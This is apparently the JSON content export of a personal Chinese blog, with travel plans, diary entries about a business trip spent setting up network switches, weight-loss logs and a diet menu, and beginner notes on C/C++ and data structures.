{"meta":{"title":"cxp's blog","subtitle":null,"description":"When the going gets tough,the tough get going!","author":"Alex","url":"https://cxpeng.cn","root":"/"},"pages":[{"title":"404 Not Found","date":"2019-11-30T14:22:03.121Z","updated":"2019-05-16T18:11:07.763Z","comments":true,"path":"404.html","permalink":"https://cxpeng.cn/404.html","excerpt":"","text":"**404 Not Found** **很抱歉，您访问的页面不存在** 可能是输入地址有误或该地址已被删除"},{"title":"","date":"2020-02-11T04:16:17.737Z","updated":"2020-02-11T04:16:17.737Z","comments":true,"path":"baidu_verify_G3Pxi8kIAd.html","permalink":"https://cxpeng.cn/baidu_verify_G3Pxi8kIAd.html","excerpt":"","text":"G3Pxi8kIAd"},{"title":"","date":"2020-03-06T05:10:10.162Z","updated":"2020-03-06T05:04:11.927Z","comments":true,"path":"google360213193bf749e3.html","permalink":"https://cxpeng.cn/google360213193bf749e3.html","excerpt":"","text":"google-site-verification: google360213193bf749e3.html"},{"title":"","date":"2019-12-27T16:36:39.779Z","updated":"2019-12-27T16:36:39.755Z","comments":true,"path":"旅游计划.html","permalink":"https://cxpeng.cn/%E6%97%85%E6%B8%B8%E8%AE%A1%E5%88%92.html","excerpt":"","text":"西安游--计划 交通 去程 唐官小区到机场，5点前到机场，公交或者打车 12.29飞机 18:30-20:30，到达T2航站楼；乘坐地铁机场城际—-4号线—-2号线到钟楼—-兮栖民宿；出去吃点东西。骡马市街道和东木头市可以去看看； 返程： 6：30起床；2-4-机场城际 9:55飞机，回家 第一天游玩： 07：00起床；吃点东西赶紧去兵马俑；306路或者307路，2小时车程；玩2.5小时之内，午饭（）； 13：00 开始回来； 15：30 永兴坊打卡； 16：20 朝阳门城墙永定门下来 晚上去吃洒金桥和北广济街 夜游钟鼓楼 第二天游玩： 07：30 起床；直接洒金桥吃早餐完事就去小雁塔 10：00 小雁塔 11：00 西安博物馆； 13：00 陕西博物馆，子午张记翠华路 14：20 大雁塔 16：00 曲江池遗址公园，曲江书城， 16：00 大唐不夜城 回到回民街吃吃吃！ 吃饭钟楼就是回民街，大雁塔和小崽就在袁家村 肉夹馍：翠华路+子午路张记，马尔里，在大雁塔和陕西省博物馆旁边 泡馍：北广济街 老刘家泡馍；马峰小炒牛羊肉泡；马洪小炒泡馍；李家特色小炒泡馍；同盛斋 洒金桥：志亮八宝稀饭；胖子甑糕；老马家；马二酸汤水饺和隔壁的刘信小炒泡馍；xxx的葫芦鸡；花奶奶酸梅汤，黄家羊肉泡馍；老金家蛋菜夹馍 石家包子 陕菜：古今长安老茶坊、长安大排档，醉长安 回民街：老回访麻辣烫；陕拾叁；桂花糕；盛志望麻将酿皮 肉丸麻辣烫：李维一肉丸胡辣汤：推荐：老常家；刘老虎；马奎 康乐路 高家烤肉 大皮院5号 东木头市： 老白家油泼面 马振面 竹间葫芦鸡"},{"title":"关于我","date":"2019-11-30T14:22:03.119Z","updated":"2019-09-01T05:55:06.679Z","comments":true,"path":"about/index.html","permalink":"https://cxpeng.cn/about/index.html","excerpt":"","text":"个人信息 蔡祥朋|1995年 教育背景 2017.9 ~ 2020.3 上海大学 通信硕士 2013.9 ~ 2017.6 青岛大学 电子科学学士 爱好唱歌、打篮球、弹吉他，"},{"title":"分类列表","date":"2019-05-16T13:45:19.000Z","updated":"2019-05-19T07:20:17.934Z","comments":true,"path":"categories/index.html","permalink":"https://cxpeng.cn/categories/index.html","excerpt":"","text":""},{"title":"文章列表","date":"2019-05-16T13:45:19.000Z","updated":"2020-02-12T16:40:33.068Z","comments":true,"path":"archives/index.html","permalink":"https://cxpeng.cn/archives/index.html","excerpt":"","text":""},{"title":"结果列表","date":"2019-05-16T13:49:36.000Z","updated":"2019-05-19T07:19:15.320Z","comments":true,"path":"mylist/index.html","permalink":"https://cxpeng.cn/mylist/index.html","excerpt":"","text":""},{"title":"友链","date":"2019-11-30T14:22:03.127Z","updated":"2019-05-19T07:18:56.686Z","comments":true,"path":"friends/index.html","permalink":"https://cxpeng.cn/friends/index.html","excerpt":"","text":"友链需提交昵称，头像链接，标签。"},{"title":"标签云","date":"2019-05-16T13:45:52.000Z","updated":"2019-05-19T07:19:43.609Z","comments":true,"path":"tags/index.html","permalink":"https://cxpeng.cn/tags/index.html","excerpt":"","text":""},{"title":"项目列表","date":"2019-05-16T14:09:42.000Z","updated":"2019-05-19T07:19:29.101Z","comments":true,"path":"projects/index.html","permalink":"https://cxpeng.cn/projects/index.html","excerpt":"","text":""}],"posts":[{"title":"第一次出差心得-02","slug":"第一次出差心得-02","date":"2020-07-19T16:14:59.000Z","updated":"2020-07-19T16:20:41.617Z","comments":true,"path":"archives/27f29441.html","link":"","permalink":"https://cxpeng.cn/archives/27f29441.html","excerpt":"","text":"昨天定好的今天的行程是早晨去仓库进行组装测试，所以早晨7点半左右醒了，订了三个闹钟，盯着时间。11点钟，技术那边的人到了酒店，之后联系这边的负责人进行交接讨论，大约是1点左右讨论完成的，全程在听他们讨论组网的网段划分，二层三层交换机的区别，网关问题，怎么根据设备的情况划分网段，考虑到后期设备的增加，需要冗余网段和网口。以及设备的命名规则，交换机的堆叠方式（堆叠卡还是堆叠线），之后去玩边吃了饭，回来休息之后前往仓库进行测试，果然到了之后我预估的问题出现了，就是一个交换机我装了相同的电口，一个交换机装了相同的光口，并没有让两种板卡都配置到一个交换机上。 之后的3个小时，技术人员开始调试交换机，包括开启交换机，进行交换机的堆叠，堆叠其实就和串联一样，现在在万兆光口上进行级联，然后通过依次配置每台交换，让两天交换机可以是一台交换机的效果，除此之外，启动了另外两台千兆的接入交换机，一次进行级联，然后和交换机通过光纤连接成环路，形成环路是为了当中间节点断掉之后，能够保证两边的数据都可以进行传输。由于是三层交换机所以分配好ip之后，可以通过ping命令判断是不是可以远程连接其他交换机和核心交换机。 大体命令很多，光看是不能够完全的学会，期间我问了一些关于交换机的相关问题，虽然我对此并没有深入的研究。 他们计划会到酒店再进行脚本的编写，脚本写好之后，明天直接拿着脚本前往现场进行调试就行。我拿设备到达酒店之后变回到房间。 明天预计安排，7点左右起床，然后慢慢小睡，等那边的安排。预计明天两种方式：1、如果不需要我参与，我就退房，下午回济南。2、听说他们是明天退房那么我就直接退房，晚上会济南。 今天的心得体会： 小公司对于人的要求就是，对自己有帮助的就是同事，不会花时间理会其他人员，虽然都是站在利益角度来看的，但是对于这种公司的做事流程的不规范，我还是很不喜欢，相互推诿，扯皮大于工作，从这两天的工作流程来看几乎没有成长，反而浪费了很多时间。 未来的两个月我自己的时间应该是安排很紧。如果不快快解决我自己毕业的问题，其他事情都需要往后稍稍。最多不能浪费两天以上的时间去做其他不相关的事情。 另一方面是关于技术的成长问题，其实对于技术人员来说我学到了一点就是应该多敲代码，熟练掌握代码的逻辑，熟练！！！！应该在书中的代码多敲一点，不管是C语言还是C++的代码，不应该是光看，画好逻辑图后，理解之后就去多敲多打，毕竟唬住人的良好的代码习惯和专业经验比较重要。 第三点就是关于学习四大件的心得，还是理解。可以采取第一遍速读，然后画图写要点，第二遍就是精读理解做笔记。 四大件：数据结构和算法、计算机网络、操作系统、设计模式 语言层面C语言、C++、linux中的shell。 学习要点就是：压缩语言的学习时间，语言的作用就是实现学习到的四大件，然后解决实际问题。要记住这一点。 语言的学习就是疯狂打代码，积累代码量，项目和刷题。","categories":[{"name":"生活随笔","slug":"生活随笔","permalink":"https://cxpeng.cn/categories/%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94/"}],"tags":[]},{"title":"第一次出差心得-01","slug":"第一次出差心得-01","date":"2020-07-19T16:14:52.000Z","updated":"2020-07-19T16:20:41.617Z","comments":true,"path":"archives/befbc5fb.html","link":"","permalink":"https://cxpeng.cn/archives/befbc5fb.html","excerpt":"","text":"第一次出外地出差。 早晨8点起床，睡了不足6个小时，打车前往高铁站。一个小时的车程到达潍坊北站，来的相当早，打电话询问怎么前往需要去的地方。 又是打车到达酒店后开始休息，期间一直在沟通华三技术的工作人员什么时候到来，包括跟我舅联系，跟华三方面的人联系。客户这边以为我是过来的技术人员，所以让我搭建交换机堆叠然后进行交换机的测试，吃完午饭后前往仓库进行交换机的组装，到达仓库后，这边的负责人就走掉了，我这边进行交换机组装了很长时间，从板卡的 安装，电源的安装，其实很简单，我这边安装的比较慢。想要开始测试的时候，询问华三的那边的人开始有消息了，和这边客户沟通了技术人员的确定地点，然后我就不知道干什么了，一直等到这边负责人回来，看时间并没有时间进行服务器和交换机的连接测试了，问我是不是对交换机的型号不熟悉，我说我是知道的，因为我之前看了技术文档了，但是不知道怎么配置，我说明天技术人员会过来，明天可以进行调试，不知道他那边是什么情况，就开始闹脾气，感觉是我耽误了它的进程，从一开始服务器和交换机这边就没有安排好，我这边也其实没问清楚，说好的开会讨论，我这边来了就完全不知道，要做什么。回去的路上可能负责人对今天的事情做的好多都不满意，感觉很不耐烦，我没有对此进行回应，会到酒店静静等待明天技术人员的到来。 写了这么多的流水账，并没有找到自己的状态，一方面是自己来这里都是蒙的，很想找到一个模板或者有人教我怎么做，但是并没有；其二是我自己并没有调整好自己的状态，整天头疼和疲惫。到目前为止还是很难受。其实回到酒店之后感觉很委屈，本来是舅的事情，想来帮忙的，自己并不是这样的人员，就算是给我钱我都没有心动，但是来到之后，可能就是自己的想法和说话，让自己处于很尴尬的地步。更让我坚定了，一定要尽自己能力去做事情，不要跨度太大，不喜欢就是不喜欢，学好做事的态度。 从今天的开始状态来说 首先我舅给我了联系方式，那就先自己联系看下别人是怎么安排的，按照自己的节奏安排行程，更舒服。 在外边做事，按照别人的安排做事，多交流沟通。 提前掌握好工作的流程尽量详细。我的问题就是没有提前问好工作流程，不要信去了现场再说，到了现场问题百出，没有问题就有鬼了。 应对客户的提问或者质疑没办法回答的情况下就先恢复说记录下来，咨询公司的专业人员，或者说文档中是这样写的。 面对客户抱怨，那就让他说，尽量保持不说话，慢慢引导转移话题，通常是工作一部分如果没有特别大的后果，其实长时间的交流沟通就会顺畅很多。","categories":[{"name":"生活随笔","slug":"生活随笔","permalink":"https://cxpeng.cn/categories/%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94/"}],"tags":[]},{"title":"C/C++初级工程师学习路线","slug":"C-C-初级工程师学习路线","date":"2020-06-10T03:44:57.000Z","updated":"2020-10-23T05:23:05.907Z","comments":true,"path":"archives/867a622d.html","link":"","permalink":"https://cxpeng.cn/archives/867a622d.html","excerpt":"","text":"对于语言的学习，我已经拉长了很长时间的战线，从最终结果来看毫无作用，并且很多知识也已经忘了，今天搜到了codesheep关于学习路线的一些指导，感觉豁然开朗，虽然不知道对不对但是很合我的口味，就是那种说了就能让人能够信服的感觉，我现在整理下来。 1.C语言 除了学习基本的语法特性之外，需要掌握它最主要的部分就是指针和内存管理 书籍可以学习《C Primer Plus》、《C和指针》、《C专家编程》 2.C++ 可以认为C++是C语言的延伸，增加了面向对象编程。包括封装继承多态、泛型编程、模板、STL等 《C++primer》、《Effective C++》、《C++标准程序库》、《STL源码剖析》、《深度探索C++对象模型》、《》、《》 语言学习一定要一鼓作气，强压力下学下来不然容易泄气 3.编程四大件 数据结构与算法：leetcode刷题、《剑指offer》、《C和C++程序员面试秘籍》 计算机网络：TCP/CP详解 操作系统：深入理解计算机系统 设计模式：不用要求你会使用所有的模式。《大话设计模式》 4.应用实践编程 学会linux 学会linux下的编译器 学会使用make和书写makefile 学会GDB调试器 后面的linux环境编程：系统编程、多线程编程、网络编程 《Unix环境高级编程》、《Linux高性能服务器编程》、《POSIX多线程程序设计》 在总结这篇博客的时候，看到了新的一篇文章，更让我眼前一亮，特别是作者的title，让人信服； https://www.zhihu.com/question/21671705/answer/1241926801 对找工作最有用的转行策略： 学一门编程语言 掌握数据结构与算法 数据库技术，好入门。 掌握一种技能： 服务器开发，尝试写一个通信软件之类的 云计算，用spark和hadoop尝试对大数据进行删改读写 AI，写一个推荐系统、搜索引擎、图形变化、语义理解的模型。 自学成功的标志：可以定义为打开简历可以看到3-4个与计算机/编程相关的项目；或者拿来大公司的面试题，可以有解题思路。 我现在还处于第一个阶段，学习一门语言。 虽然都是推荐java，但是我害怕没时间进行了，先从C语言+C++学起，因为自己比较熟悉这一部分，也愿意投入时间，掌握数据结构与算法，要和leetcode进行结合。 更新：2020-9-25 看到的一些“过来人”的关于后台开发学习和工作的经验： 后台开发之我见 C++后台开发学习路线","categories":[],"tags":[]},{"title":"阶段性总结（2）","slug":"阶段性总结（2）","date":"2020-06-06T06:25:19.000Z","updated":"2020-06-06T07:19:57.506Z","comments":true,"path":"archives/713d20ba.html","link":"","permalink":"https://cxpeng.cn/archives/713d20ba.html","excerpt":"","text":"永远年轻，永远热泪盈眶！也总有人年轻，也总有人泪眼盈眶，为什么我的年轻要经历这么多伤。 从小胖到大的过程中，没有人会批判你的身体，相反他们会安慰你“胖嘟嘟的多好看”。直到你长大，习惯了这种安慰，他们告诉你“你太胖了，要减肥啦”。后来我才明白原来长大会经历真理的更替，原本的一些是假象，跟有一些成为了笑话。 我很庆幸自己一直在成长， 我很感激有人会跟我说好事多磨， 我很期盼我的未来！ 以前我知道总有人年轻，却不知道什么是年轻，青少年是年轻？外表清新是年轻？还是内心纯净是年轻？ 但在某一个时间我意识到：我正年轻。 年轻就是不为外界教条束缚自己，为自己赢得世界尊重，就是跌倒之后起身还能甩甩头继续做自己。 当我意识到这一点的时候，突然生活就洒进了阳光。我内心在想我年轻的时候，如果不能做成一件不为讨好他人，只为取悦自己的事，那就是失败的人生。虽然我也不知道什么是成功，更别提失败，但总要做些什么。 为此我尝试了很多的事情，考研，找工作的目标，学英语等。 有些事我做到了，有些事尽管不停的尝试，还是有点乏善可陈。 最近的一个目标就是瘦身，为的纠正错误的自己，提高自己的自信，跟深层次为地球减负，做一个改变世界的人。 某一天我会自豪的说我改变了世界，哪怕改变了一点点。 今天是减肥的第二个阶段总结。 今早体重200斤，这周必下200斤，这是我对自己的承诺。 记录下这段时间的改变： 1.采用了放纵日的概念，每周都有放纵日，这次是吃了烧烤和啤酒。 2.开始跟着keep开练，出汗量增加了，运动次数一天一练变为了一天二练，基本上是走跑结合+keep计划。 3.睡眠时间保证的很好，基本上一天睡眠时间6-8小时之间。 还需要改进的地方： 1.关于饮食。饮食这段时间会出现晚餐的高热量，甚至出现了暴饮暴食。 2.运动损伤。身体出现了伤痛，包括膝盖疼痛、脚踝疼痛、大腿韧带拉伤、足底筋膜炎。 3.减肥时间。为了达到目标，我出现了过度焦虑不，习惯性的花费大量时间来查询相关的资料，很多都是无用功，效率低下，已经严重影响了自己其他的计划，耽误了很多时间。 改进方案： 1.关于饮食。虽然我知道节食很不好，但是晚餐我可能得使用极端的方式-过午不食来改善下，慢慢降低自己在晚间的饮食需求。另外一种方式就是饿的时候大量喝水，给自己饱腹感，并冲淡胃液，降低胃部损伤。还有我发现中午吃的蔬菜过多了晚上就没了青菜储备，未来应该多准备点青菜分两顿解决，不要怕做饭麻烦。 2.关于运动损伤。一种方式就是设置休息日，休息一天让自己家身体恢复；一种方式就是在慢跑和快走之前，先进行半小时的减肥操让身体活动起来。减肥操我准备跟keep和搏击操进行替换训练。除此之外为了避免其他未知的损伤出现，需要购买一些护具，比如压缩裤和运动护膝（非用不可的时刻）、护腕（手踝脚踝） 3.关于时间的问题。我的时间管理能力比较差，能够想到的方式就是花费将近一天的时间提前做好计划，这一周就按照这个计划来，不再改动，重要的一点是需要设置未完成计划的补救方案。要求计划尽量详细，我会把每次的计划贴在博客上，计划制定之后每天按照计划来做，不再重新设置新的计划。 未来10天目标向着190斤迈进。 相信自己， GO！","categories":[{"name":"减肥之路","slug":"减肥之路","permalink":"https://cxpeng.cn/categories/%E5%87%8F%E8%82%A5%E4%B9%8B%E8%B7%AF/"}],"tags":[]},{"title":"阶段性总结（1）","slug":"阶段性总结（1）","date":"2020-05-22T23:24:54.000Z","updated":"2020-06-06T06:26:36.292Z","comments":true,"path":"archives/63888f54.html","link":"","permalink":"https://cxpeng.cn/archives/63888f54.html","excerpt":"","text":"减肥本就是循序渐进的过程，都说好事多磨，这也许就是一件吧。 计划每十天就做一次总结 10天前，我开始认真执行减肥计划，虽然不是新手了，但是换了环境以后，很难执行原先的计划。几乎所有的新手开始都会打着减肥的号子，抱着必瘦的决心，去开始节食减肥，就算是去健身房的那批人也会不由自主的过度节食，起初我也是这样。这样的效果就是可以快速变瘦，让我享受成为瘦子的喜悦，后果也很明显，就是很难形成良好的习惯，最终导致自己重回体重巅峰。所以这次我要变得清醒点，给自己明确了目标：不再复胖，一要养成可以形成习惯的运动方案，二要有一个可以长期执行的饮食计划。 到今天过去十天了，我尝试七天减肥食谱，前四天完成的很好，最后三天的计划没有完成；采取的运动是每天快走，有效运动时间在30-45分钟之间，运动强度在可承受范围内。 最终我的是体重由原来的208斤减到了204斤，初有成效！ 需要改进的地方： 1.过度放纵自己。这十天除了吃食谱上的菜，还有海吃了自助餐，和朋友吃了麻辣小龙虾，期间也喝了奶茶、饮料。 2.晚饭超量。有时候晚餐吃的热量和油脂比较多。 3.运动强度很轻。快走就算是一个小时也不出很出汗。 4.睡眠不好。倒班倒的没有规律，每次睡眠 3、4个小时。白天早晨的时间用来补觉了。 改进方案： 1.还是得给自己设置放纵日，每周一天的放纵日，放纵晚记录下来标红，提醒自己这周没有放纵机会了。 2.晚饭先计划吃水煮青菜+水果来解决，量大热量少，还能补充维C。 3.更改计划：自重训练+有氧运动，时间1:1.5，快走和慢跑交替。 4.睡眠问题。保证7到7个半时的睡眠，更改运动的时间为晚上6点左右开始。 未来10天的关键点是控制晚餐和睡眠，看看10天之后有什么效果吧！","categories":[{"name":"减肥之路","slug":"减肥之路","permalink":"https://cxpeng.cn/categories/%E5%87%8F%E8%82%A5%E4%B9%8B%E8%B7%AF/"}],"tags":[]},{"title":"C++之引用","slug":"C-之引用","date":"2020-05-13T11:07:07.000Z","updated":"2020-05-13T11:07:50.711Z","comments":true,"path":"archives/72f72ceb.html","link":"","permalink":"https://cxpeng.cn/archives/72f72ceb.html","excerpt":"","text":"","categories":[{"name":"C++系列学习","slug":"C-系列学习","permalink":"https://cxpeng.cn/categories/C-%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0/"}],"tags":[]},{"title":"C到C++还有哪些升级","slug":"C到C-还有哪些升级","date":"2020-05-13T10:45:52.000Z","updated":"2020-10-23T05:18:33.481Z","comments":true,"path":"archives/26a73c29.html","link":"","permalink":"https://cxpeng.cn/archives/26a73c29.html","excerpt":"","text":"1、新增类型之bool类型 布尔类型是C++新增的基础类型。利用关键字true和false来表示真值和非真值。但是在实际处理中，是利用整数类型来表示，占用一个字节。也就是真为1非真为0，任何非0的值都是别人定为真，为0则为假。这样说有点绕，用代码更清晰。 1bool a = false; //编译器在编译中就会将a用一个字节的整数0来存储23int b = -2;45a = b; //将b赋值给a，那么a就变为了-2非0值，那么编译器就会将a处理为1来保存， bool类型是可以进行运算的，运算的结果在编译器的处理下只有两个整数值，0和1。或者说true和false 2、C++中三目运算符 在C语言中三目运算符是不能作为左值，C++中可以。 原因在于C语言中三目运算符返回的是值，而不是具体的变量，这是不能作为左值使用的；在C++中只要可能的返回都是变量时，那么返回的是引用而不是具体的值，引用在C++中就是某一变量的别名，可以作为左值使用。 3、新增引用—变量的别名 引用是已经定义的变量的别名，因此引用的类型和变量类型相同，并且必须定义初始化。&amp; 由于引用是别名，那么可以对原变量的存储空间进行操作。 C++中，关于引用的底层实现其实是指针，可以引用一段内存空间，但是注意引用不是对象。","categories":[{"name":"C++系列学习","slug":"C-系列学习","permalink":"https://cxpeng.cn/categories/C-%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0/"}],"tags":[]},{"title":"const关键字","slug":"const关键字","date":"2020-05-13T09:51:46.000Z","updated":"2020-10-23T05:21:10.957Z","comments":true,"path":"archives/49f01bdb.html","link":"","permalink":"https://cxpeng.cn/archives/49f01bdb.html","excerpt":"","text":"学过C语言首先一个问题就是C语言能不能定义常量？ 可能首先想到的就是通过const关键字来定义常量，或者说是enum枚举类型来定义常量。但是我们通过指针可以更改const修饰的常量，是因为C语言在遇到const修饰的常量会分配存储空间，也就允许了在制定存储位置被修改。那么就做不到从根本上定义常量。 在C++中是不是也有这样的，不是。 C++中虽然也是可能为const常量分配存储空间，但是不使用存储空间中的值，它使用的是编译过程中产生的符号表。在编译过程中当遇到extern修饰const变量也就是修饰全局变量和使用&amp;取地址符时候，就会开辟一段新的存储空间和C语言一样。而具体使用的时候就是直接查询静态编译中提前存储的值，就不会在运行时被指针修改。 区别： C语言中const变量只是只读变量，会分配存储空间 C++中可能分配存储空间，到那时不一定使用其中的值。 const常量和宏定义的区别 宏定义是被预编译器处理的，只是简单的文本替换 const常量是被编译器处理的，编译器会进行类型检查和作用域检查。 也就是说在使用过程中const常量是有作用域范围的，而宏定义是在全局范围内都可以进行文本替换。","categories":[{"name":"C++系列学习","slug":"C-系列学习","permalink":"https://cxpeng.cn/categories/C-%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0/"}],"tags":[]},{"title":"掌握一门语言之c++","slug":"掌握一门语言之c","date":"2020-05-12T08:14:51.000Z","updated":"2020-10-23T05:06:29.330Z","comments":true,"path":"archives/e3bfd105.html","link":"","permalink":"https://cxpeng.cn/archives/e3bfd105.html","excerpt":"","text":"从C语言到C++语言 从面对过程开发到面对对象开发，从直接分析问题，直接设计解决问题的函数进行分步解决问题，到用模拟现实世界的方法来描述解决问题的方法。C++语言是从C语言+面对对象特性发展来的，是C语言的继承。高效的面对对象语言，并且能够兼容以前的代码这就是C++语言的诞生的优势。存在就有价值，那我到底为什么学习C++呢，明明利用Python中的各种库可以很好的玩耍，我说服自己或者说学习C++根本就不用说服自己的原因： 为什么非要学习C++语言？ 1、可以说C++语言是作为一些语言（特别是面对对象）的学习基础，涉及到语言的设计方法和学习思路，都是可以作为启发来学习其他语言； 2、解决更多的问题，也就是学习C++更为在后来的成长路线上走捷径。虽然学好C++的成本很高，但是在大部分的领域可以做到一劳永逸。 3、现代软件的设计过程或者是开发过程，可能是用不同语言来编写的，对于现代软件的要求包括需要能更灵活的添加修改来适应用户不同的需求、具有更好的移植性，降低新软件的开发成本、还需要更方便的部署和更新。这些特性我还没有真正理解C++的优势是什么，但是还是觉得现代软件的设计语言中C++的功能多并且运行比较高效。 4、最重要就是以前面试的时候被问:你会C++吗？我说会；然后做过什么项目？我答无，然后面试就无了。 既然要好好学习C++语言，不光是需要学习好语言的特性，还要掌握和其他的语言的关系，力求在软件开发中可以为自己提供更多解决方案。首先来说C++是C语言的继承那么就肯定有很多的升级，对于C语言和C++语言一族来说，继承又有哪些升级呢。 C语言到C++的升级 首先最重要的升级第一点是类型的加强，C语言开发中变量的定义必须要在作用于前进行定义，否则就不知道变量在哪，而对于C++来说可以在使用时进行定义，更为灵活，开发效率更高；还比如对于C语言中默认类型f()和int f(void)之类的使用C++中就不能使用，是为了避免二义性。 第二点的加强就是面对对象设计思想的加强，之所以说是加强，是因为C++中集成了面对对象设计的语法。 C++更强调实用性，之前说定义变量的不同就是这样，并且举个例子对于register关键字的使用，在C语言中就是会声明定义到变量存到寄存器中，是没办法取到该变量的地址的，但是C++的编译器就对此进行了优化，所以用不用那个关键字都没啥用。在编译时需要存到寄存器中的变量可以自动优化到里面，并且可以取地址。 二义性，C++对于类型的检查非常严格，不允许二义性，C语言中可能存在可以在不同位置定义全局变量，但是在C++中是不被允许的。C++中你可以多次声明变量，但是不允许你多次定义。 struct关键字的使用。C语言中struct是代表多数据类型的集合，不能称之为新类型，如果像作为新类型使用必须使用typedef关键字来修饰，而C++中，struct关键字可以作为一种新类型来定义对象。 前面提到的默认函数类型，C语言中如果没有定义函数的返回类型和参数类型，都会默认为 int类型，但是来强类型语言的C++中，这种操作就只能活在梦里，不告诉他类型是不行的。是不是更为严谨了。 编译器优化问题。由于解决问题的代码多样性，不同的程序运行效率都是不同的，为了有更好的运行效率，就需要语言本身对于代码进行优化，由于C++语言特性比较多，使用场景也更广，所以C++编译器的优化必定是强于C语言的。","categories":[{"name":"C++系列学习","slug":"C-系列学习","permalink":"https://cxpeng.cn/categories/C-%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0/"}],"tags":[]},{"title":"7天减肥食谱","slug":"7天减肥食谱","date":"2020-05-07T02:49:49.000Z","updated":"2020-06-06T07:21:56.539Z","comments":true,"path":"archives/1c62288a.html","link":"","permalink":"https://cxpeng.cn/archives/1c62288a.html","excerpt":"","text":"一周减脂食谱：肉蛋奶+果蔬+粗粮 现在试试7天食谱+运动会瘦几斤，胖子买裤子是最难的了！！！ 周一 早： 全麦吐司1片 牛奶1杯 苹果1个 中： 芹菜粥；其中芹菜100g+大米100g+小米100g 晚： 生菜沙拉；使用油醋汁 油醋汁配比：香油:醋:蜂蜜（可有可无）:酱油=2:1:1:1,需要黑胡椒或者蒜泥+芝麻或者芝麻酱，搅拌均匀并冷藏。 生菜+西红柿+黄瓜+洋葱+苦菊+紫蓝+鸡蛋+红萝卜等 周二 早： 全麦吐司2片 酸奶1杯 葡萄干10个或者用其他代替 中： 杂蔬鸡胸肉 做法：一碗鸡胸肉切丁+淀粉+盐+耗油+生抽+姜丝，基本是1:1比例，抓匀腌制15min，然后送到锅里面进行翻炒最后加入杂蔬（玉米+青豆+胡萝卜切成丁） 晚： 水蒸蛋：香菇+姜末 周三 早： 酸奶1杯 水煮蛋2个 中； 红豆薏米粥或者黑米粥450g 晚： 苹果1个 坚果15g 周四 早： 红薯粥：450g 中： 手撕鸡胸肉或者是杂蔬鸡胸肉 凉拌黄瓜 晚： 橙子/苹果1个 葡萄干或其他 周五 早： 燕麦泡牛奶300g 中： 素菜沙拉同周一 晚： 水蒸蛋1份 周六 早： 全麦吐司面包2片 水煮蛋1个 中： 杂蔬鸡胸肉 晚： 小番茄10个 坚果15g 周天 早： 三明治1个 牛奶1杯 中： 土豆泥 水煮蛋2个 晚： 水果沙拉1份，根据自己心情来买。","categories":[{"name":"减肥之路","slug":"减肥之路","permalink":"https://cxpeng.cn/categories/%E5%87%8F%E8%82%A5%E4%B9%8B%E8%B7%AF/"}],"tags":[]},{"title":"追寻偶像是一种精神追随吗？","slug":"追寻偶像是一种精神追随吗？","date":"2020-03-13T02:28:05.000Z","updated":"2020-05-07T03:02:43.578Z","comments":true,"path":"archives/19c7f8c2.html","link":"","permalink":"https://cxpeng.cn/archives/19c7f8c2.html","excerpt":"","text":"乐队的夏天邀请到了新裤子，很激动能不去现场就能听到多首他们的歌曲，不仅如此，节目的氛围还能让人嗨起来。《没有理想的人不伤心》是我听新裤子的第一首歌，一见钟情，恋爱也不过如此，何况听歌还可以移情别恋，喜欢的没有道理可言。那是在2017年的考研期间，习惯听歌学习，听李建、赵雷、薛之谦，是奔着他们的歌词；听纯音乐，是为了他们的旋律。正好新裤子的这首歌同李健的《异乡人》一样，听到歌词就能引起共鸣，在异乡一个人，不知为什么坚持。学生就是喜欢感伤，我天生的“自卑”心理，更是增添几道伤疤在心口，那时候我开始思考，我的精神内核是什么，或者说是精神追求。 如果问我追求是什么，我肯定首先想到的是拥有健康的身体，漂亮的老婆，温馨的家庭，富裕的生活，这些都是物质的，哪能支持达到这些目标的力量就说不上来了。喜欢的NBA球星都有自己的偶像，譬如年轻一代的球星喜欢科比，钟爱其曼巴精神，喜欢那句名言“你知道凌晨四点的，洛杉矶吗？我知道！”，为了冠军目标他们找到科比来为自己加油鼓起。我却不知道什么是偶像？我的偶像是谁？有些话得掏心窝子说，我自己展开看看心中装的是什么","categories":[{"name":"生活随笔","slug":"生活随笔","permalink":"https://cxpeng.cn/categories/%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94/"}],"tags":[]},{"title":"算法精解：C语言描述（二）","slug":"算法精解：C语言描述（二）","date":"2020-02-14T07:52:30.000Z","updated":"2020-03-06T05:07:11.897Z","comments":true,"path":"archives/9f68689e.html","link":"","permalink":"https://cxpeng.cn/archives/9f68689e.html","excerpt":"","text":"理解栈这种结构可以那他的应用记录函数调用的数据块来说，当发生函数调用时，用栈记录下调用信息，直到该函数执行完成之后进行返回，这样看来函数调用和函数的返回是一个相反的过程。 理解队列，也可以举例有的类型数据的使用需要按照先后优先顺序，队列就可以完成存储具有先后使用顺序的数据。 应用： 信号量 事件处理 X Windows系统 生产者-消费者问题 C中的函数调用 栈特点：先进后出，删除从后进入栈的数据开始。 关于栈的实现和接口定义，用链表来实现栈，由于本身栈就是链表来实现的所以很多接口定义可以直接使用链表的操作； 队列特点是：先进先出；","categories":[{"name":"技术经验","slug":"技术经验","permalink":"https://cxpeng.cn/categories/%E6%8A%80%E6%9C%AF%E7%BB%8F%E9%AA%8C/"}],"tags":[]},{"title":"算法精解：C语言描述（一）","slug":"算法精解：C语言描述（一）","date":"2020-02-14T01:58:12.000Z","updated":"2020-03-06T05:07:11.894Z","comments":true,"path":"archives/af7e8446.html","link":"","permalink":"https://cxpeng.cn/archives/af7e8446.html","excerpt":"","text":"链表：是一种数据结构类型。链表元素在内存中的存储位置不是连续的，且动态分配内存，元素之间通过指针链接。 链表的形式有单链表、双链表、循环链表。下面分别记录下每种形式和他们之间的区别 单链表对于单链表，链表元素包括数据域和指针域，元素之间通过next指针链接。 其相关的接口定义包括初始化list_init、销毁list_destroy、插入list_ins_next、删除操作list_rem_next。 应用之一：页帧管理。 双链表双向链表对于单链表来说，不同在于提供了反向遍历操作，含有前向指针prev、后向指针next; 接口和单链表相似。 循环链表循环链表是一种链表形式，可以是单向也可以是双向，特殊的地方在于其尾指针不是指向NULL,而是指向头元素。 